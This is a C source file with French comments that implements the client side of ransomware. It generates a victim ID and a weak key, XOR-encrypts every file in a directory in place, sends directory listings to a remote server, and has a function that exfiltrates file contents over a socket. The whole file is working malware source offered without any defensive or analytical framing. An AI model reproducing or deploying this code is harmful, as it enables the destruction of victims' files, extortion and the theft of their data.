#include "common.h"
#include "fonction.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#ifdef _WIN32
#include <windows.h>
#include <sys/stat.h>
#else
#include <dirent.h>
#include <sys/stat.h>
#endif

#define BUFFER_SIZE 1024
#define SIGNATURE "Fichier chiffré - Secure Encryption"
#define ALLOCATION_SIZE (1024 * 1024)

// ---------------- Génération d'identifiant ----------------
void generer_client_id(char *id, size_t length) {
    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    srand((unsigned int)time(NULL));
    for (size_t i = 0; i < length; i++) {
        id[i] = charset[rand() % (sizeof(charset) - 1)];
    }
    id[length] = '\0';
}

// ---------------- Vérification de fichier régulier ----------------
#ifdef _WIN32
int isRegularFile(const char *path) {
    struct _stat pathStat;
    if (_stat(path, &pathStat) != 0) {
        fprintf(stderr, "Erreur d'info de fichier\n");
        return 0;
    }
    return (pathStat.st_mode & S_IFREG) != 0;
}
#else
int isRegularFile(const char *path) {
    struct stat pathStat;
    if (stat(path, &pathStat) != 0) {
        perror("Erreur d'info de fichier");
        return 0;
    }
    return S_ISREG(pathStat.st_mode);
}
#endif

// ---------------- Liste des fichiers ----------------
#ifdef _WIN32
void listFiles(my_socket_t clientSocket) {
    WIN32_FIND_DATAA findData;
    HANDLE hFind = FindFirstFileA(".\\*", &findData);
    if (hFind == INVALID_HANDLE_VALUE) {
        const char *error = "Erreur de listing des fichiers.\n";
        send(clientSocket, error, (int)strlen(error), 0);
        return;
    }

    do {
        char buffer[1024];
        snprintf(buffer, sizeof(buffer), "%s\n", findData.cFileName);
        if (send(clientSocket, buffer, (int)strlen(buffer), 0) < 0) {
            fprintf(stderr, "Erreur d'envoi d'un fichier au serveur.\n");
            FindClose(hFind);
            return;
        }
    } while (FindNextFileA(hFind, &findData));
    FindClose(hFind);

    const char *endMessage = "END_OF_LIST\n";
    if (send(clientSocket, endMessage, (int)strlen(endMessage), 0) < 0) {
        perror("Erreur d'envoi du signal END_OF_LIST");
    }
}
#else
void listFiles(my_socket_t clientSocket) {
    DIR *d = opendir(".");
    if (!d) {
        const char *error = "Erreur de listing des fichiers.\n";
        send(clientSocket, error, (int)strlen(error), 0);
        return;
    }

    struct dirent *dir;
    while ((dir = readdir(d)) != NULL) {
        char buffer[1024];
        snprintf(buffer, sizeof(buffer), "%s\n", dir->d_name);
        if (send(clientSocket, buffer, (int)strlen(buffer), 0) < 0) {
            perror("Erreur d'envoi d'un fichier au serveur");
            closedir(d);
            return;
        }
    }
    closedir(d);

    const char *endMessage = "END_OF_LIST\n";
    if (send(clientSocket, endMessage, (int)strlen(endMessage), 0) < 0) {
        perror("Erreur d'envoi du signal END_OF_LIST");
    }
}
#endif

// ---------------- Chiffrement ----------------
void generateEncryptionKey(char *keyBuffer, size_t length) {
    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    srand((unsigned int)time(NULL));
    for (size_t i = 0; i < length - 1; i++) {
        keyBuffer[i] = charset[rand() % (sizeof(charset) - 1)];
    }
    keyBuffer[length - 1] = '\0';
}

void encryptFile(const char *filename, const char *key) {
    if (!isRegularFile(filename)) {
        fprintf(stderr, "Le chemin spécifié n'est pas un fichier régulier : %s\n", filename);
        return;
    }

    FILE *file = fopen(filename, "rb+");
    if (!file) {
        perror("Erreur d'ouverture du fichier");
        return;
    }

    char buffer[BUFFER_SIZE];
    size_t bytesRead;
    while ((bytesRead = fread(buffer, 1, sizeof(buffer), file)) > 0) {
        for (size_t i = 0; i < bytesRead; i++) {
            buffer[i] ^= key[i % strlen(key)];
        }
        fseek(file, -bytesRead, SEEK_CUR);
        fwrite(buffer, 1, bytesRead, file);
    }
    fclose(file);
}

void encryptFiles(const char *directory, const char *key) {
#ifdef _WIN32
    WIN32_FIND_DATAA findData;
    HANDLE hFind = FindFirstFileA(".\\*", &findData);
    if (hFind == INVALID_HANDLE_VALUE) {
        perror("Erreur lors de l'ouverture du répertoire");
        return;
    }

    do {
        if (strcmp(findData.cFileName, ".") != 0 && strcmp(findData.cFileName, "..") != 0) {
            char filepath[BUFFER_SIZE];
            snprintf(filepath, sizeof(filepath), "%s\\%s", directory, findData.cFileName);
            encryptFile(filepath, key);
            printf("Fichier chiffré : %s\n", filepath);
        }
    } while (FindNextFileA(hFind, &findData));
    FindClose(hFind);
#else
    DIR *d = opendir(directory);
    if (!d) {
        perror("Erreur lors de l'ouverture du répertoire");
        return;
    }

    struct dirent *dir;
    char filepath[BUFFER_SIZE];

    while ((dir = readdir(d)) != NULL) {
        if (strcmp(dir->d_name, ".") != 0 && strcmp(dir->d_name, "..") != 0) {
            snprintf(filepath, sizeof(filepath), "%s/%s", directory, dir->d_name);
            encryptFile(filepath, key);
            printf("Fichier chiffré : %s\n", filepath);
        }
    }
    closedir(d);
#endif
}

void logError(const char *message) {
    fprintf(stderr, "Erreur : %s\n", message);
}

// ---------------- Exfiltration ----------------
int exfiltration(my_socket_t clientSocket, const char *fichier) {
    FILE *f = fopen(fichier, "rb");
    if (f == NULL) {
        printf("Erreur: impossible d'ouvrir le fichier %s\n", fichier);
        const char *errorMsg = "ERROR_OPEN_FILE";
        send(clientSocket, errorMsg, (int)strlen(errorMsg), 0);
        return 1;
    }

    char buffer[BUFFER_SIZE];
    size_t bytesRead;

    while ((bytesRead = fread(buffer, 1, sizeof(buffer), f)) > 0) {
        if (send(clientSocket, buffer, (int)bytesRead, 0) <= 0) {
            printf("Erreur lors de l'envoi des données.\n");
            fclose(f);
            return 1;
        }
    }

    fclose(f);

    const char *endMessage = "END_OF_FILE";
    if (send(clientSocket, endMessage, (int)strlen(endMessage), 0) <= 0) {
        printf("Erreur lors de l'envoi du signal de fin.\n");
        return 1;
    }

    printf("Exfiltration du fichier %s terminée.\n", fichier);
    return 0;
}
